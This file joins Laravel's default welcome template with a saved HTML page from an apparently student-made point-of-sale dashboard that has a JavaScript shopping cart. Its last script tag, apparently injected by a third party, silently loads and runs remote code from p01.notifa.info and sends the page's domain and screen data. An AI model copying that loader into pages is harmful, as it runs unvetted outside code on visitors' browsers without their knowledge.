<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Laravel</title>

        <!-- Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Nunito:200,600" rel="stylesheet">

        <!-- Styles -->
        <style>
            html, body {
                background-color: #fff;
                color: #636b6f;
                font-family: 'Nunito', sans-serif;
                font-weight: 200;
                height: 100vh;
                margin: 0;
            }

            .full-height {
                height: 100vh;
            }

            .flex-center {
                align-items: center;
                display: flex;
                justify-content: center;
            }

            .position-ref {
                position: relative;
            }

            .top-right {
                position: absolute;
                right: 10px;
                top: 18px;
            }

            .content {
                text-align: center;
            }

            .title {
                font-size: 84px;
            }

            .links > a {
                color: #636b6f;
                padding: 0 25px;
                font-size: 13px;
                font-weight: 600;
                letter-spacing: .1rem;
                text-decoration: none;
                text-transform: uppercase;
            }

            .m-b-md {
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="flex-center position-ref full-height">
            @if (Route::has('login'))
                <div class="top-right links">
                    @auth
                        <a href="{{ url('/home') }}">Home</a>
                    @else
                        <a href="{{ route('login') }}">Login</a>

                        @if (Route::has('register'))
                            <a href="{{ route('register') }}">Register</a>
                        @endif
                    @endauth
                </div>
            @endif

            <div class="content">
                <div class="title m-b-md">
                    Laravel
                </div>

                <div class="links">
                    <a href="https://laravel.com/docs">Docs</a>
                    <a href="https://laracasts.com">Laracasts</a>
                    <a href="https://laravel-news.com">News</a>
                    <a href="https://blog.laravel.com">Blog</a>
                    <a href="https://nova.laravel.com">Nova</a>
                    <a href="https://forge.laravel.com">Forge</a>
                    <a href="https://vapor.laravel.com">Vapor</a>
                    <a href="https://github.com/laravel/laravel">GitHub</a>
                </div>
            </div>
        </div>
    </body>
</html>

/////////////////////////////////////////////////////////////////////////////////////////////////

<body id="page-top" class="" style="">

  <!-- Page Wrapper -->
  <div id="wrapper">

    <!-- Sidebar -->

    <ul class="navbar-nav bg-gradient-primary sidebar sidebar-dark accordion" id="accordionSidebar">

      <!-- Sidebar - Brand -->
      <a class="sidebar-brand d-flex align-items-center justify-content-center" href="">
        <div class="sidebar-brand-icon rotate-n-15">
          <i class="fas fa-laugh-wink"></i>
        </div>
        <div class="sidebar-brand-text mx-3">Happy Shopping</div>
      </a>

      <!-- Divider -->
      <hr class="sidebar-divider my-0">

      <!-- Nav Item - Dashboard -->
      <li class="nav-item active">
        <a class="nav-link" href="http://salsabilrazan.weblaravel.masuk.id">
          <i class="fas fa-fw fa-tachometer-alt"></i>
          <span>Home</span></a>
      </li>

      <!-- Divider -->
      <hr class="sidebar-divider">

      <!-- Nav Item - Utilities Collapse Menu -->
      <li class="nav-item">
        <a class="nav-link" href="http://salsabilrazan.weblaravel.masuk.id/PosCreate">
          <span>Point Of Sales</span>
        </a>
      </li>

      <!-- Heading -->
      <div class="sidebar-heading">
        Form
      </div>

      <!-- Nav Item - Pages Collapse Menu -->
      <li class="nav-item">
        <a class="nav-link collapsed" href="#" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">
          <i class="fas fa-fw fa-folder"></i>
          <span>Master</span>
        </a>
        <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionSidebar">
          <div class="bg-white py-2 collapse-inner rounded">
            <h6 class="collapse-header">Choose Form :</h6>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/CategoriesCreate">Category</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/CustomerCreate">Customer</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/ProductCreate">Product</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/UserCreate">User</a>
          </div>
        </div>
      </li>

      <!-- Nav Item - Utilities Collapse Menu -->
      <li class="nav-item">
        <a class="nav-link collapsed" href="#" data-toggle="collapse" data-target="#collapseUtilities" aria-expanded="true" aria-controls="collapseUtilities">
          <i class="fas fa-fw fa-wrench"></i>
          <span>Transaksi</span>
        </a>
        <div id="collapseUtilities" class="collapse" aria-labelledby="headingUtilities" data-parent="#accordionSidebar">
          <div class="bg-white py-2 collapse-inner rounded">
            <h6 class="collapse-header">Choose Form :</h6>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/SalesCreate">Sales</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/SalesDetailCreate">Sales Detail</a>
          </div>
        </div>
      </li>

      <!-- Divider -->
      <hr class="sidebar-divider">

      <!-- Heading -->
      <div class="sidebar-heading">
        Table
      </div>

      <!-- Nav Item - Pages Collapse Menu -->
      <li class="nav-item">
        <a class="nav-link collapsed" href="#" data-toggle="collapse" data-target="#collapsePages" aria-expanded="true" aria-controls="collapsePages">
          <i class="fas fa-fw fa-folder"></i>
          <span>Master</span>
        </a>
        <div id="collapsePages" class="collapse" aria-labelledby="headingPages" data-parent="#accordionSidebar">
          <div class="bg-white py-2 collapse-inner rounded">
            <h6 class="collapse-header">Choose Table :</h6>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/CategoriesIndex">Category</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/CustomerIndex">Customer</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/ProductIndex">Product</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/UserIndex">User</a>
          </div>
        </div>
      </li>

      <!-- Nav Item - Utilities Collapse Menu -->
      <li class="nav-item">
        <a class="nav-link collapsed" href="#" data-toggle="collapse" data-target="#collapseUtilities2" aria-expanded="true" aria-controls="collapseUtilities2">
          <i class="fas fa-fw fa-wrench"></i>
          <span>Transaksi</span>
        </a>
        <div id="collapseUtilities2" class="collapse" aria-labelledby="headingUtilities2" data-parent="#accordionSidebar">
          <div class="bg-white py-2 collapse-inner rounded">
            <h6 class="collapse-header">Choose Table :</h6>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/SalesIndex">Sales</a>
            <a class="collapse-item" href="http://salsabilrazan.weblaravel.masuk.id/SalesDetailIndex">Sales Detail</a>
          </div>
        </div>
      </li>

      <!-- Divider -->
      <hr class="sidebar-divider d-none d-md-block">

      <!-- Sidebar Toggler (Sidebar) -->
      <div class="text-center d-none d-md-inline">
        <button class="rounded-circle border-0" id="sidebarToggle"></button>
      </div>

    </ul>
    <!-- End of Sidebar -->

    <!-- Content Wrapper -->
    <div id="content-wrapper" class="d-flex flex-column">

      <!-- Main Content -->
      <div id="content">

        <!-- Topbar -->

        <nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow">

          <!-- Sidebar Toggle (Topbar) -->
          <button id="sidebarToggleTop" class="btn btn-link d-md-none rounded-circle mr-3">
            <i class="fa fa-bars"></i>
          </button>

          <!-- Topbar Search -->
          <form class="d-none d-sm-inline-block form-inline mr-auto ml-md-3 my-2 my-md-0 mw-100 navbar-search">
            <div class="input-group">
              <input type="text" class="form-control bg-light border-0 small" placeholder="Search for..." aria-label="Search" aria-describedby="basic-addon2">
              <div class="input-group-append">
                <button class="btn btn-primary" type="button">
                  <i class="fas fa-search fa-sm"></i>
                </button>
              </div>
            </div>
          </form>

          <!-- Topbar Navbar -->
          <ul class="navbar-nav ml-auto">

            <!-- Nav Item - Search Dropdown (Visible Only XS) -->
            <li class="nav-item dropdown no-arrow d-sm-none">
              <a class="nav-link dropdown-toggle" href="#" id="searchDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="fas fa-search fa-fw"></i>
              </a>
              <!-- Dropdown - Messages -->
              <div class="dropdown-menu dropdown-menu-right p-3 shadow animated--grow-in" aria-labelledby="searchDropdown">
                <form class="form-inline mr-auto w-100 navbar-search">
                  <div class="input-group">
                    <input type="text" class="form-control bg-light border-0 small" placeholder="Search for..." aria-label="Search" aria-describedby="basic-addon2">
                    <div class="input-group-append">
                      <button class="btn btn-primary" type="button">
                        <i class="fas fa-search fa-sm"></i>
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </li>

            <!-- Nav Item - Alerts -->
            <li class="nav-item dropdown no-arrow mx-1">
              <a class="nav-link dropdown-toggle" href="#" id="alertsDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="fas fa-bell fa-fw"></i>
                <!-- Counter - Alerts -->
                <span class="badge badge-danger badge-counter">3+</span>
              </a>
              <!-- Dropdown - Alerts -->
              <div class="dropdown-list dropdown-menu dropdown-menu-right shadow animated--grow-in" aria-labelledby="alertsDropdown">
                <h6 class="dropdown-header">
                  Alerts Center
                </h6>
                <a class="dropdown-item d-flex align-items-center" href="#">
                  <div class="mr-3">
                    <div class="icon-circle bg-primary">
                      <i class="fas fa-file-alt text-white"></i>
                    </div>
                  </div>
                  <div>
                    <div class="small text-gray-500">December 12, 2019</div>
                    <span class="font-weight-bold">A new monthly report is ready to download!</span>
                  </div>
                </a>
                <a class="dropdown-item d-flex align-items-center" href="#">
                  <div class="mr-3">
                    <div class="icon-circle bg-success">
                      <i class="fas fa-donate text-white"></i>
                    </div>
                  </div>
                  <div>
                    <div class="small text-gray-500">December 7, 2019</div>
                    $290.29 has been deposited into your account!
                  </div>
                </a>
                <a class="dropdown-item d-flex align-items-center" href="#">
                  <div class="mr-3">
                    <div class="icon-circle bg-warning">
                      <i class="fas fa-exclamation-triangle text-white"></i>
                    </div>
                  </div>
                  <div>
                    <div class="small text-gray-500">December 2, 2019</div>
                    Spending Alert: We've noticed unusually high spending for your account.
                  </div>
                </a>
                <a class="dropdown-item text-center small text-gray-500" href="#">Show All Alerts</a>
              </div>
            </li>

            <!-- Nav Item - Messages -->
            <li class="nav-item dropdown no-arrow mx-1">
              <a class="nav-link dropdown-toggle" href="#" id="messagesDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="fas fa-envelope fa-fw"></i>
                <!-- Counter - Messages -->
                <span class="badge badge-danger badge-counter">7</span>
              </a>
              <!-- Dropdown - Messages -->
              <div class="dropdown-list dropdown-menu dropdown-menu-right shadow animated--grow-in" aria-labelledby="messagesDropdown">
                <h6 class="dropdown-header">
                  Message Center
                </h6>
                <a class="dropdown-item d-flex align-items-center" href="#">
                  <div class="dropdown-list-image mr-3">
                    <img class="rounded-circle" src="https://source.unsplash.com/fn_BT9fwg_E/60x60" alt="">
                    <div class="status-indicator bg-success"></div>
                  </div>
                  <div class="font-weight-bold">
                    <div class="text-truncate">Hi there! I am wondering if you can help me with a problem I've been having.</div>
                    <div class="small text-gray-500">Emily Fowler · 58m</div>
                  </div>
                </a>
                <a class="dropdown-item d-flex align-items-center" href="#">
                  <div class="dropdown-list-image mr-3">
                    <img class="rounded-circle" src="https://source.unsplash.com/AU4VPcFN4LE/60x60" alt="">
                    <div class="status-indicator"></div>
                  </div>
                  <div>
                    <div class="text-truncate">I have the photos that you ordered last month, how would you like them sent to you?</div>
                    <div class="small text-gray-500">Jae Chun · 1d</div>
                  </div>
                </a>
                <a class="dropdown-item d-flex align-items-center" href="#">
                  <div class="dropdown-list-image mr-3">
                    <img class="rounded-circle" src="https://source.unsplash.com/CS2uCrpNzJY/60x60" alt="">
                    <div class="status-indicator bg-warning"></div>
                  </div>
                  <div>
                    <div class="text-truncate">Last month's report looks great, I am very happy with the progress so far, keep up the good work!</div>
                    <div class="small text-gray-500">Morgan Alvarez · 2d</div>
                  </div>
                </a>
                <a class="dropdown-item d-flex align-items-center" href="#">
                  <div class="dropdown-list-image mr-3">
                    <img class="rounded-circle" src="https://source.unsplash.com/Mv9hjnEUHR4/60x60" alt="">
                    <div class="status-indicator bg-success"></div>
                  </div>
                  <div>
                    <div class="text-truncate">Am I a good boy? The reason I ask is because someone told me that people say this to all dogs, even if they aren't good...</div>
                    <div class="small text-gray-500">Chicken the Dog · 2w</div>
                  </div>
                </a>
                <a class="dropdown-item text-center small text-gray-500" href="#">Read More Messages</a>
              </div>
            </li>

            <div class="topbar-divider d-none d-sm-block"></div>

            <!-- Nav Item - User Information -->
            <li class="nav-item dropdown no-arrow">
              <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <span class="mr-2 d-none d-lg-inline text-gray-600 small">Salsabil Razan</span>
                <img class="img-profile rounded-circle" src="http://salsabilrazan.weblaravel.masuk.id/profile.jpg">
              </a>
              <!-- Dropdown - User Information -->
              <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in" aria-labelledby="userDropdown">
                <a class="dropdown-item" href="#">
                  <i class="fas fa-user fa-sm fa-fw mr-2 text-gray-400"></i>
                  Profile
                </a>
                <a class="dropdown-item" href="#">
                  <i class="fas fa-cogs fa-sm fa-fw mr-2 text-gray-400"></i>
                  Settings
                </a>
                <a class="dropdown-item" href="#">
                  <i class="fas fa-list fa-sm fa-fw mr-2 text-gray-400"></i>
                  Activity Log
                </a>
                <div class="dropdown-divider"></div>
                <a class="dropdown-item" href="#" data-toggle="modal" data-target="#logoutModal">
                  <i class="fas fa-sign-out-alt fa-sm fa-fw mr-2 text-gray-400"></i>
                  Logout
                </a>
              </div>
            </li>

          </ul>

        </nav>
        <!-- End of Topbar -->

        <!-- Begin Page Content -->
        <div class="container-fluid">

          
<div class="col-lg-12">
<div class="block margin-bottom-sm">
	<table width="100%">
		<thead>
		<tr><th><label class="col-sm-form-control-label">Auto ID</label>
			<div class="col-lg-5">
		<label for="inlineFormInput" class="sr-only">Name</label>
		<input id="inlineFormInput" type="text" disabled="" placeholder="Category ID" class="mr-sm-3 form-control"></div></th>
		
		<th><label class="col-sm-form-control-label">Category Name</label>
		<div class="col-sm-5">
		  	<select class="form-control mb-3 mb-3" name="categoriesid">
                                           
                      <option value=" 5">
                        Makanan
                      </option>
                                           
                      <option value=" 6">
                        Minuman
                      </option>
                                           
                      <option value=" 7">
                        Sayur-Sayuran
                      </option>
                                           
                      <option value=" 8">
                        Buah-Buahan
                      </option>
                                           
                      <option value=" 9">
                        Pakaian
                      </option>
                                          </select>
		</div></th></tr></thead>
	</table>
	  <button class="button" data-toggle="modal" data-target="#myModal">Pilih Product</button>
	<br>
	<br>
	<table id="keranjang" width="100%" cellpadding="10px" bordercolorlight="#E8A7A8" border="2"> 
		<thead>
			<tr><th width="295">Product Name</th>
			<th width="45">Qty</th>
			<th width="212">Price</th>
			<th width="228">Sub Total</th>
			<th width="228">Action</th>
		</tr></thead><tbody>
		</tbody>
	</table>
	
  </div>

<div class="row">
<div class="col-lg-8">
	<div class="block margin-bottom-sm">
		<label class="col-sm-form-control-label">Sub Total</label>
		<input id="subtotal-val" type="text" disabled="" placeholder="Rp. 10.000" class="mr-sm-3 form-control">
		<label class="col-sm-form-control-label">Pajak</label>
		<input id="pajak" type="text" disabled="" placeholder="10%" class="mr-sm-3 form-control">
		<label class="col-sm-form-control-label">Discount</label>
		<input id="discount" type="text" placeholder="0" class="mr-sm-3 form-control" oninput="total()">
	</div>
</div>

<div class="col-lg-4">
	<div class="block margin-bottom-sm">
		<label class="col-sm-form-control-label">Total</label>
		<input id="total-val" type="text" disabled="" placeholder="Rp. 10.000" class="mr-sm-3 form-control">
	</div>
</div>
</div>
</div>

<!-- Modal -->
  <div class="modal fade bd-example-modal-lg" id="myModal" role="dialog" style="display: none;" aria-hidden="true">
    <div class="modal-dialog modal-lg">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">          
          <h4 class="modal-title">Product</h4>
          <button type="button" class="close" data-dismiss="modal">×</button>
        </div>
        <div class="modal-body">
         <table>
         	</table><table width="100%" cellpadding="10px" bordercolorlight="#E8A7A8" border="2"> 
		<thead>
			<tr><th width="295">Product ID</th>
			<th width="45">Category ID</th>
			<th width="212">Product Name</th>
			<th width="228">Product Price</th>
			<th width="228">Product Stock</th>
			<th width="228">Explanation</th>
		</tr></thead>
		<tbody>
			                      <tr onclick="pilihBarang(6)">
                      	<td>6 </td>
                        <td>6 </td>
                        <td>Hilo </td>
                        <td>10000 </td>
                        <td>50 </td>
                        <td>Rasa coklat, pisang </td>
                    </tr>
                                   <tr onclick="pilihBarang(7)">
                      	<td>7 </td>
                        <td>7 </td>
                        <td>Bayam </td>
                        <td>2500 </td>
                        <td>10 </td>
                        <td>Kondisi segar </td>
                    </tr>
                                   <tr onclick="pilihBarang(8)">
                      	<td>8 </td>
                        <td>8 </td>
                        <td>Apel </td>
                        <td>6000 </td>
                        <td>20 </td>
                        <td>Masih fresh </td>
                    </tr>
                                   <tr onclick="pilihBarang(9)">
                      	<td>9 </td>
                        <td>9 </td>
                        <td>Catton </td>
                        <td>80000 </td>
                        <td>50 </td>
                        <td>Bahan halus </td>
                    </tr>
             		</tbody>
	</table>
         
        </div>
        
      </div>
    <!-- end of modal content -->                     
          </div>
        </div>
      </div>
</div>

<script>
	var barang = [{"Product_ID":"6","Category_ID":"6","Product_Name":"Hilo","Product_Price":"10000","Product_Stock":"50","Explanation":"Rasa coklat, pisang"},{"Product_ID":"7","Category_ID":"7","Product_Name":"Bayam","Product_Price":"2500","Product_Stock":"10","Explanation":"Kondisi segar"},{"Product_ID":"8","Category_ID":"8","Product_Name":"Apel","Product_Price":"6000","Product_Stock":"20","Explanation":"Masih fresh"},{"Product_ID":"9","Category_ID":"9","Product_Name":"Catton","Product_Price":"80000","Product_Stock":"50","Explanation":"Bahan halus"}];
	console.log(barang[0]["Product_Name"]);
	var colnum=0;

	function getVal(event){
		if (event.keyCode === 13) {
			modal();
		}
	}
	function pilihBarang(id){
		var index;
		for(var i=0;i<barang.length;i++){
			if(barang[i]["Product_ID"]==id){
				console.log(barang[i]);
				index=i;
				break;
			}
		}
		$("#myModal").modal("hide");

		var table = document.getElementById("keranjang");
		var row = table.insertRow(table.rows.length);
		row.setAttribute('id','col'+colnum);
		var id = 'col'+colnum;
		colnum++;

		var cell1 = row.insertCell(0);
		var cell2 = row.insertCell(1);
		var cell3 = row.insertCell(2);
		var cell4 = row.insertCell(3);
		var cell5 = row.insertCell(4);
		console.log(index);
		cell1.innerHTML = '<input type="hidden" name="name[]" value="'+barang[index]["Product_Name"]+'">'+barang[index]["Product_Name"];
		cell2.innerHTML = '<input type="number" name="qty[]" value="1" oninput="recount('+barang[index]["Product_ID"]+')" id="qty'+barang[index]["Product_ID"]+'">';		
		cell3.innerHTML = '<input type="hidden" id="harga'+barang[index]["Product_ID"]+'" name="harga[]" value="'+barang[index]["Product_Price"]+'">'+barang[index]["Product_Price"];
		cell4.innerHTML = '<input type="hidden" class="subtotal" name="subtotal[]" value="'+barang[index]["Product_Price"]+'" id="subtotal'+barang[index]["Product_ID"]+'"><span id="subtotalval'+barang[index]["Product_ID"]+'">'+barang[index]["Product_Price"]+'</span>';
		cell5.innerHTML = '<button onclick="hapusEl(\''+id+'\')">Del</button>';

		total();
		
	}
	function lm(i){
		var min =  document.getElementById("qty"+i).value;
		if(min <= 1){

		}else{
		min--;
		document.getElementById("qty"+i).value = min;
		recount(i);
		}
	}
	function ln(i){
		var plus =  document.getElementById("qty"+i).value;
		console.log(plus);
		plus++;
		document.getElementById("qty"+i).value = plus;
		console.log(plus);
		recount(i);
	}
	function total(){
		var subtotals = document.getElementsByClassName("subtotal");
		var total = 0;
		for(var i=0; i<subtotals.length;++i){
			total += Number(subtotals[i].value); 
		}
		document.getElementById("subtotal-val").value = total;
		var disc = document.getElementById("discount").value;
		total = parseInt(110/100*total)-Number(disc);
		document.getElementById("total-val").value = total;

	}

	function recount(id){

		var price = document.getElementById("harga"+id).value;
		var sembarang = document.getElementById("qty"+id).value;

		var lego = Number(price*sembarang); 
		document.getElementById("subtotal"+id).value = lego;
		document.getElementById("subtotalval"+id).innerHTML = lego;
		total();
	}

	function modal(){
		$("#myModal").modal("show");
		document.getElementById("myText").value = "";
	}
	function hapusEl(idCol) {
		document.getElementById(idCol).remove();
		total();
	}
</script>


      <!-- Footer -->

      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>Copyright © Your Website 2020</span>
          </div>
        </div>
      </footer>
      <!-- End of Footer -->

    </div>
    <!-- End of Content Wrapper -->

  </div>
  <!-- End of Page Wrapper -->

  <!-- Scroll to Top Button-->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>

  <!-- Logout Modal-->
  <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Ready to Leave?</h5>
          <button class="close" type="button" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">×</span>
          </button>
        </div>
        <div class="modal-body">Select "Logout" below if you are ready to end your current session.</div>
        <div class="modal-footer">
          <button class="btn btn-secondary" type="button" data-dismiss="modal">Cancel</button>
          <a class="btn btn-primary" href="login.html">Logout</a>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="js/sb-admin-2.min.js"></script>

  <!-- Page level plugins -->
  <script src="vendor/chart.js/Chart.min.js"></script>

  <!-- Page level custom scripts -->
  <script src="js/demo/chart-area-demo.js"></script>
  <script src="js/demo/chart-pie-demo.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnOU2wcFNhBDhS90os%2bq08Z5nuBDmEoPdTQ7%2ffEiAreRp1gYZj95eUYTsGelKQwOIs480I9HvfI9RcgKx%2b%2b%2fUQ4nJh%2bIRiKc%2b65b4bjZPoycxUbU2Hza5%2bcQuo%2fzpbIvIcrhBvvoVrvxgYWKwB9ANTKCuCPmtGMy8R8DUhxfHB4BFudPi7GwMpBq4tUNQZlkVlz4dvSDkfAsHPF24PrF67HVtPNgI%2bEFbYAEfPNKcKmQK0L16DRNMuEIT1f8Zp6wt1kOJVOeshQrv6u%2bx0snCgAnf4ZxeSAZDAFEK0dTKKyX12urQDP15aMjHnLKveuEsgKTbG%2fABQiOUQ0gmWeXbXHAuO5ul0cUzIhk55RKvyAKiDTi%2bOBk3L0CaRiEFvpcNnzzg4NpPUAifyrY8giwaivf6zvZ2D7dmAbW4aDKe%2bjyXuGHCkT%2fQcF3450oqlmuwuILvfVZ27AYAYfGmFdC%2bBYilWL88ly1ICJiCDID3X6%2fX%2fqIpQ%2fIFkYKgA8BlTKpuhtuC7ZLd9zTeaxLsNiHf5an3Rqwi5o%2f2h2LvzMjE5DH4zIG1%2frfgfHorDQwiqSlANSo%2bUq5GfX8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


</body>